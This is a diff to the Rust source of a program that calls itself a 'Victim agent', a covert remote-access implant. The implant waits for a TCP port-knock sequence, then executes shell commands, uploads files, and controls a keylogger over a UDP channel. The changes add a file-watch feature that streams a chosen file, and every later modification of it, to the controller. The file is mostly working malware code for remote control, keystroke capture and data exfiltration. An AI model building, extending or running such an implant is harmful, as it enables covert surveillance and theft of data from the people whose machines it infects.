@@ -8,20 +8,21 @@
 /// Compliance: All protocol data in UDP payload only.
 /// UDP header fields are OS-managed; no transport-layer abuse.
 
-use std::io::{self, Write};  // FIX: Add Write import
+use std::io::{self, Write};
 use std::net::{IpAddr, Ipv4Addr, SocketAddr, UdpSocket};
 use std::sync::mpsc::{self, Receiver, Sender};
 use std::thread;
 use std::time::{Duration, Instant};
 use std::process::Command;
 use std::path::PathBuf;
-
 use pnet::packet::tcp::TcpPacket;
 use pnet::packet::ipv4::Ipv4Packet;
 use pnet::packet::ip::IpNextHeaderProtocols;
 use pnet::packet::Packet;
 use pnet::transport::{transport_channel, TransportChannelType::Layer3, ipv4_packet_iter};
 use pnet_datalink as datalink;
+use notify::{Config, Event, EventKind, RecommendedWatcher, RecursiveMode, Watcher};
+use std::sync::mpsc::channel as notify_channel;
 
 // Import modules
 mod port_knkr;
@@ -31,11 +32,10 @@ mod keylogger;
 use port_knkr::{SimpleRng, generate_seed};
 use packet::{PacketHeader, HEADER_SIZE,
              PACKET_TYPE_ACK, PACKET_TYPE_HEARTBEAT,
-             PACKET_TYPE_CMD, PACKET_TYPE_CMD_RESP, 
+             PACKET_TYPE_CMD, PACKET_TYPE_CMD_RESP,
              PACKET_TYPE_CTRL, PACKET_TYPE_FILE, PACKET_TYPE_KEYLOG,
              CTRL_START_KEYLOGGER, CTRL_STOP_KEYLOGGER,
              CTRL_REQUEST_KEYLOG, CTRL_UNINSTALL};
-
 use keylogger::Control as KeylogControl;
 
 // Configuration
@@ -55,13 +55,17 @@ struct Victim {
     file_download_active: bool,
     file_download_path: Option<String>,
     file_download_sent: usize,
+    file_watch_active: bool,
+    file_watch_path: Option<String>,
+    file_watch_stop_tx: Option<Sender<()>>,
+    file_watch_cmd_addr: Option<SocketAddr>,
 }
 
 impl Victim {
     fn new() -> io::Result<Self> {
         let local_ip = Self::find_active_interface()
             .ok_or_else(|| io::Error::new(io::ErrorKind::NotFound, "No active interface"))?;
-        
+
         Ok(Self {
             local_ip,
             current_dir: Some(std::env::current_dir()?),
@@ -74,6 +78,10 @@ impl Victim {
             file_download_active: false,
             file_download_path: None,
             file_download_sent: 0,
+            file_watch_active: false,
+            file_watch_path: None,
+            file_watch_stop_tx: None,
+            file_watch_cmd_addr: None,
         })
     }
 
@@ -103,12 +111,14 @@ impl Victim {
         loop {
             if let Ok((packet, _src)) = rx_iter.next() {
                 let ip = match Ipv4Packet::new(packet.packet()) {
-                    Some(p) => p, None => continue,
+                    Some(p) => p,
+                    None => continue,
                 };
                 if ip.get_next_level_protocol() != IpNextHeaderProtocols::Tcp { continue; }
                 
                 let tcp = match TcpPacket::new(ip.payload()) {
-                    Some(p) => p, None => continue,
+                    Some(p) => p,
+                    None => continue,
                 };
                 
                 if tcp.get_flags() != 0x02 { continue; }
@@ -134,7 +144,7 @@ impl Victim {
                                 if ip2.get_source() != source_ip { continue; }
                                 if let Some(tcp2) = TcpPacket::new(ip2.payload()) {
                                     if tcp2.get_flags() == 0x02 
-                                        && tcp2.get_destination() == knocks[knock_idx] {
+                                       && tcp2.get_destination() == knocks[knock_idx] {
                                         println!("[*] Knock {}/3 from {}", knock_idx + 1, source_ip);
                                         knock_idx += 1;
                                     }
@@ -325,6 +335,18 @@ impl Victim {
             return Ok(());
         }
 
+        // File watch start command (0x71)
+        if !cmd.is_empty() && cmd.as_bytes()[0] == 0x71 {
+            self.handle_file_watch_start(&cmd.as_bytes()[1..], udp, cmd_addr)?;
+            return Ok(());
+        }
+
+        // File watch stop command (0x74)
+        if !cmd.is_empty() && cmd.as_bytes()[0] == 0x74 {
+            self.handle_file_watch_stop(&cmd.as_bytes()[1..]);
+            return Ok(());
+        }
+
         if cmd.trim_start().starts_with("cd ") {
             let dir = cmd.trim_start_matches("cd ").trim();
             
@@ -333,12 +355,12 @@ impl Victim {
             } else {
                 PathBuf::from(dir)
             };
-            
+             
             if new_dir.exists() && new_dir.is_dir() {
                 match new_dir.canonicalize() {
                     Ok(canon) => {
                         self.current_dir = Some(canon);
-                        self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, "".as_bytes())?;
+                        self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, " ".as_bytes())?;
                     }
                     Err(e) => {
                         let err = format!("cd: {}\n", e);
@@ -375,7 +397,7 @@ impl Victim {
                     self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, stderr_str.as_bytes())?;
                 }
                 if stdout_str.is_empty() && stderr_str.is_empty() {
-                    self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, "".as_bytes())?;
+                    self.send_response(udp, cmd_addr, PACKET_TYPE_CMD_RESP, 0, " ".as_bytes())?;
                 }
                 Ok(())
             }
@@ -458,19 +480,141 @@ impl Victim {
         let total_chunks = (file_data.len() + CHUNK_SIZE - 1) / CHUNK_SIZE;
         
         for (i, chunk) in file_data.chunks(CHUNK_SIZE).enumerate() {
-            self.send_response(udp, cmd_addr, PACKET_TYPE_FILE, 0, chunk)?;  // FIX: Now accepts &[u8]
+            self.send_response(udp, cmd_addr, PACKET_TYPE_FILE, 0, chunk)?;
             print!("\r[*] Sending chunk {}/{}...", i + 1, total_chunks);
-            io::stdout().flush().ok();  // FIX: Write trait is now in scope
+            io::stdout().flush().ok();
             thread::sleep(Duration::from_millis(50));
         }
         
-        self.send_response(udp, cmd_addr, PACKET_TYPE_FILE, 0, &[0xFF])?;  // FIX: Now accepts &[u8]
+        self.send_response(udp, cmd_addr, PACKET_TYPE_FILE, 0, &[0xFF])?;
         println!("\n[+] File download complete!");
         Ok(())
     }
 
+    fn handle_file_watch_start(
+        &mut self,
+        payload: &[u8],
+        udp: &UdpSocket,
+        cmd_addr: SocketAddr,
+    ) -> io::Result<()> {
+
+        if payload.is_empty() {
+            return Ok(());
+        }
+
+        let path_len = payload[0] as usize;
+        if payload.len() < 1 + path_len {
+            return Ok(());
+        }
+
+        let file_path = String::from_utf8_lossy(&payload[1..1 + path_len]).to_string();
+        println!("[*] Starting file watch on: {}", file_path);
+
+        // ------------------------------------------------------------
+        // Send initial file content
+        // ------------------------------------------------------------
+        if let Ok(data) = std::fs::read(&file_path) {
+            const CHUNK_SIZE: usize = 1024;
+
+            for chunk in data.chunks(CHUNK_SIZE) {
+                self.send_response(udp, cmd_addr, PACKET_TYPE_FILE, 0, chunk)?;
+                thread::sleep(Duration::from_millis(50));
+            }
+
+            // End marker
+            self.send_response(udp, cmd_addr, PACKET_TYPE_FILE, 0, &[0xFF])?;
+        }
+
+        // ------------------------------------------------------------
+        // Setup watcher
+        // ------------------------------------------------------------
+        let (tx, rx) = notify_channel();
+        let (stop_tx, stop_rx) = mpsc::channel::<()>();
+
+        let mut watcher = RecommendedWatcher::new(tx, Config::default())
+            .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
+
+        watcher
+            .watch(std::path::Path::new(&file_path), RecursiveMode::NonRecursive)
+            .map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
+
+        self.file_watch_active = true;
+        self.file_watch_path = Some(file_path.clone());
+        self.file_watch_stop_tx = Some(stop_tx);
+        self.file_watch_cmd_addr = Some(cmd_addr);
+
+        let file_path_clone = file_path.clone();
+        let udp_clone = udp.try_clone()?;
+
+        // ------------------------------------------------------------
+        // Spawn watcher thread
+        // ------------------------------------------------------------
+        thread::spawn(move || {
+            loop {
+                // Stop signal
+                if stop_rx.try_recv().is_ok() {
+                    println!("[*] File watch stopped for {}", file_path_clone);
+                    break;
+                }
+
+                match rx.recv_timeout(Duration::from_millis(100)) {
+
+                    // Outer channel OK
+                    Ok(inner) => match inner {
+
+                        // Actual event OK
+                        Ok(event) => match event.kind {
+
+                            EventKind::Modify(_) => {
+                                if let Ok(data) = std::fs::read(&file_path_clone) {
+                                    let mut msg = vec![0x73]; // Update marker
+                                    msg.extend_from_slice(&data);
+
+                                    let _ = udp_clone.send_to(&msg, cmd_addr);
+                                    let _ = udp_clone.send_to(&[0xFF], cmd_addr); // End marker
+                                }
+                            }
+
+                            EventKind::Remove(_) => {
+                                let _ = udp_clone.send_to(&[0x72], cmd_addr); // Delete marker
+                                break;
+                            }
+
+                            _ => {}
+                        },
+
+                        // notify::Error
+                        Err(e) => {
+                            eprintln!("[watch error] {:?}", e);
+                        }
+                    },
+
+                    // Timeout is normal
+                    Err(mpsc::RecvTimeoutError::Timeout) => {}
+
+                    // Channel disconnected
+                    Err(mpsc::RecvTimeoutError::Disconnected) => {
+                        break;
+                    }
+                }
+            }
+        });
+
+        Ok(())
+    }
+
+    fn handle_file_watch_stop(&mut self, _payload: &[u8]) {
+        println!("[*] Stopping file watch");
+        if let Some(tx) = self.file_watch_stop_tx.take() {
+            let _ = tx.send(());
+        }
+        self.file_watch_active = false;
+        self.file_watch_path = None;
+        self.file_watch_cmd_addr = None;
+    }
+
     fn send_response(&self, udp: &UdpSocket, addr: SocketAddr, 
-                     ptype: u8, subtype: u8, content: &[u8]) -> io::Result<()> {  // FIX: Changed from &str to &[u8]
+                     ptype: u8, subtype: u8, content: &[u8]) -> io::Result<()> {
         let content_str = String::from_utf8_lossy(content);
         let header = PacketHeader::new(ptype, subtype, &content_str);
         let mut packet = Vec::with_capacity(HEADER_SIZE + content.len());
@@ -484,9 +628,8 @@ impl Victim {
 
 fn main() -> io::Result<()> {
     println!("[*] Victim agent starting...");
-    
     let mut victim = Victim::new()?;
-    
+
     match victim.run() {
         Ok(_) => Ok(()),
         Err(e) => {
